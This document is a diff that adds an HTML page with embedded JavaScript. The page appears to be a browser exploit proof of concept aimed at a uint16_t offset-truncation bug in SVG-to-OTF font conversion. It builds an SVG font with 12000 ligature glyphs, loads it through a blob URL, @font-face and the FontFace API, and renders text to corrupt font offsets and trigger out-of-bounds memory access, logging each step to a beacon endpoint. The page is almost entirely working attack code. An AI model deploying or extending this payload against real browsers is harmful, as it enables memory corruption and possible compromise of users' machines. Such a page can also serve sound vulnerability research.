@@ -1,0 +1,141 @@
+<!doctype html><html><head><meta charset="utf-8"><title>p173a</title></head><body>
+<script>
+// p173a — SVG font Placeholder uint16_t truncation overflow
+// SVGToOTFFontConversion.cpp:118 ASSERT(delta < uint16_t::max()) stripped in release
+// Strategy: generate SVG font with 12000 ligature glyphs via JS → blob URL → @font-face
+// Corrupted OTF offsets → FreeType parses wrong data → potential OOB read/write
+// Beacon prefix: V173A-
+
+(function() {
+  function B(tag) {
+    try { new Image().src = '/BEACON?V173A-' + tag + '&t=' + Date.now(); } catch(e) {}
+  }
+
+  B('BOOT');
+
+  // Build SVG font document with many ligature glyphs
+  var GLYPH_COUNT = 12000;
+
+  var parts = [];
+  parts.push('<?xml version="1.0" encoding="UTF-8"?>');
+  parts.push('<svg xmlns="http://www.w3.org/2000/svg">');
+  parts.push('<defs><font id="BF" horiz-adv-x="1000">');
+  parts.push('<font-face font-family="BugFont" units-per-em="1000" ascent="800" descent="-200"/>');
+  parts.push('<missing-glyph horiz-adv-x="500" d="M0 0L500 0L500 800L0 800Z"/>');
+
+  // 256 base single-codepoint glyphs (U+0100 to U+01FF)
+  for (var i = 0; i < 256; i++) {
+    parts.push('<glyph unicode="&#x' + (0x100 + i).toString(16) + ';" horiz-adv-x="600" d="M100 0L500 0L500 700L100 700Z"/>');
+  }
+  B('BASE-256');
+
+  // 12000 ligature glyphs with 2-codepoint unicode values
+  // Each creates a ligature pair in GSUB → ~8-10 bytes per pair
+  // 12000 × 10 = ~120KB → overflows uint16_t offsets
+  var count = 0;
+  for (var a = 0; a < 256 && count < GLYPH_COUNT; a++) {
+    for (var b = 0; b < 256 && count < GLYPH_COUNT; b++) {
+      var c1 = '&#x' + (0x100 + a).toString(16) + ';';
+      var c2 = '&#x' + (0x100 + b).toString(16) + ';';
+      parts.push('<glyph unicode="' + c1 + c2 + '" horiz-adv-x="800" d="M50 0L750 0L750 750L50 750Z"/>');
+      count++;
+    }
+  }
+  B('LIGS-' + count);
+
+  parts.push('</font></defs></svg>');
+
+  var svgText = parts.join('\n');
+  B('SVG-' + Math.round(svgText.length / 1024) + 'KB');
+
+  // Create blob URL for the SVG font
+  var blob = new Blob([svgText], { type: 'image/svg+xml' });
+  var fontUrl = URL.createObjectURL(blob);
+  parts = null;
+  svgText = null;
+  B('BLOB-OK');
+
+  // Load via @font-face → triggers CachedSVGFont → convertSVGToOTFFont
+  var style = document.createElement('style');
+  style.textContent = '@font-face { font-family: "BugFont"; src: url("' + fontUrl + '") format("svg"); }';
+  document.head.appendChild(style);
+  B('FONTFACE-SET');
+
+  // Try FontFace API too (parallel path)
+  var fontFaceOk = false;
+  try {
+    var ff = new FontFace('BugFont2', 'url("' + fontUrl + '")');
+    ff.load().then(function(loaded) {
+      document.fonts.add(loaded);
+      B('FF-API-OK');
+      fontFaceOk = true;
+    }).catch(function(e) {
+      B('FF-API-ERR-' + String(e).substring(0, 30));
+    });
+  } catch(e) {
+    B('FF-API-CATCH-' + String(e).substring(0, 30));
+  }
+
+  // Create test elements that use the font → forces font load + render
+  var testDiv = document.createElement('div');
+  testDiv.style.fontFamily = '"BugFont", sans-serif';
+  testDiv.style.fontSize = '48px';
+
+  // Use ligature-triggering codepoint pairs
+  var testText = '';
+  for (var i = 0; i < 50; i++) {
+    testText += String.fromCharCode(0x100 + (i % 256));
+    testText += String.fromCharCode(0x100 + ((i + 1) % 256));
+    testText += ' ';
+  }
+  testDiv.textContent = testText;
+  document.body.appendChild(testDiv);
+  B('RENDER-START');
+
+  // Force synchronous layout
+  void testDiv.offsetWidth;
+  B('LAYOUT-DONE');
+
+  // Also try inline SVG font path (CSSFontFaceSource)
+  var svgEl = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
+  svgEl.setAttribute('style', 'position:absolute;left:-9999px;width:0;height:0');
+  // Small inline SVG font just to test if path works
+  svgEl.innerHTML = '<defs><font id="IF" horiz-adv-x="1000"><font-face font-family="InlineFont" units-per-em="1000" ascent="800" descent="-200"/><missing-glyph d="M0 0L500 0L500 800L0 800Z"/><glyph unicode="A" d="M100 0L500 0L500 700L100 700Z"/></font></defs>';
+  document.body.appendChild(svgEl);
+  B('INLINE-SVG');
+
+  // Phase 2: wait for font loading and check results
+  setTimeout(function() {
+    B('CHECK-1S');
+
+    // Check if font loaded
+    var loaded = document.fonts.check('48px BugFont');
+    B('FONT-LOADED-' + loaded);
+
+    // Check if we're alive (font parsing didn't crash)
+    var cs = getComputedStyle(testDiv);
+    var width = testDiv.offsetWidth;
+    B('WIDTH-' + width);
+
+    // Stress: render more text at different sizes
+    for (var sz = 12; sz <= 72; sz += 12) {
+      var d = document.createElement('div');
+      d.style.fontFamily = '"BugFont", sans-serif';
+      d.style.fontSize = sz + 'px';
+      d.textContent = testText;
+      document.body.appendChild(d);
+      void d.offsetWidth;
+    }
+    B('STRESS-OK');
+
+    setTimeout(function() {
+      B('CHECK-5S');
+      var loaded2 = document.fonts.check('48px BugFont');
+      B('FONT-LOADED2-' + loaded2);
+      B('DONE');
+    }, 4000);
+  }, 2000);
+
+})();
+</script>
+</body></html>
